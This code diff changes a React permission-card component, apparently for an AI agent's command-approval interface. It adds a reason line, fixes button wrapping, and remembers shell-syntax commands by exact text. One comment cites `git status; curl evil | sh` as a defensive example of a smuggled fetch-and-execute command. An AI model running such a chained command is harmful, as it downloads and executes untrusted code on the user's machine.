@@ -1227,6 +1227,14 @@ function Permission({ item }: { item: Extract<ChatItem, { kind: "permission" }> 
         {item.consequence ? (
           <div className="t-meta mt-2 text-ink-2">{item.consequence}</div>
         ) : null}
+        {/* Why this one stopped, which only has an answer worth reading when
+            auto mode is on and something held the call back regardless.
+            With the switch off the answer is that this app asks before it
+            acts, and printing that on every card is how people learn to stop
+            reading them. */}
+        {item.reason ? (
+          <div className="t-micro mt-2 text-ink-3">{item.reason}</div>
+        ) : null}
         {item.rule ? (
           // Always in the layout, only sometimes visible.  Adding this line
           // on hover grew the card and moved the buttons out from under the
@@ -1246,9 +1254,14 @@ function Permission({ item }: { item: Extract<ChatItem, { kind: "permission" }> 
             Remembers: {shortRule(item.rule)}
           </div>
         ) : null}
-        <div className="mt-3 flex gap-[6px]">
+        {/* `flex-wrap` and `whitespace-nowrap` together, because the panel
+            is resizable and the interface text size goes to 135 per cent: a
+            label that wraps to two lines inside a box pinned at 28px spills
+            out of it, and a row that cannot wrap pushes Deny past the edge
+            of the card.  The row gives way now, not the buttons. */}
+        <div className="mt-3 flex flex-wrap items-center gap-[6px]">
           <button
-            className="h-[28px] pen-button px-3 t-ui"
+            className="h-[28px] shrink-0 whitespace-nowrap pen-button px-3 t-ui"
             data-testid="allow"
             disabled={!armed}
             onClick={() => decide("allow")}
@@ -1259,13 +1272,14 @@ function Permission({ item }: { item: Extract<ChatItem, { kind: "permission" }> 
               A
             </span>
           </button>
-          {/* A command carrying shell syntax gets no rule, because a rule
-              scoped to its first word would not mean what it says.  Offering
-              to remember one anyway would be a promise the fence cannot
-              keep, so the button is not there. */}
+          {/* A command carrying shell syntax is remembered by its exact
+              text rather than by its first word, because a rule on the word
+              would be a promise the fence cannot keep: `Bash:git` would
+              cover `git status; curl evil | sh`.  So the button is offered
+              here now, and what it remembers is exactly this command. */}
           {item.rule ? (
             <button
-              className="h-[28px] rounded-[3px] border border-line px-3 t-ui disabled:opacity-40"
+              className="h-[28px] shrink-0 whitespace-nowrap rounded-[3px] border border-line px-3 t-ui disabled:opacity-40"
               data-testid="always"
               disabled={!armed}
               onMouseEnter={() => setScope(true)}
@@ -1280,13 +1294,9 @@ function Permission({ item }: { item: Extract<ChatItem, { kind: "permission" }> 
                 ⇧A
               </span>
             </button>
-          ) : (
-            <span className="t-micro self-center text-ink-3">
-              This one is asked every time: it runs more than one command.
-            </span>
-          )}
+          ) : null}
           <button
-            className="h-[28px] rounded-[3px] border border-line px-3 t-ui text-ink-2 hover:border-error hover:text-error disabled:opacity-40"
+            className="h-[28px] shrink-0 whitespace-nowrap rounded-[3px] border border-line px-3 t-ui text-ink-2 hover:border-error hover:text-error disabled:opacity-40"
             data-testid="deny"
             disabled={!armed}
             onClick={() => decide("deny")}
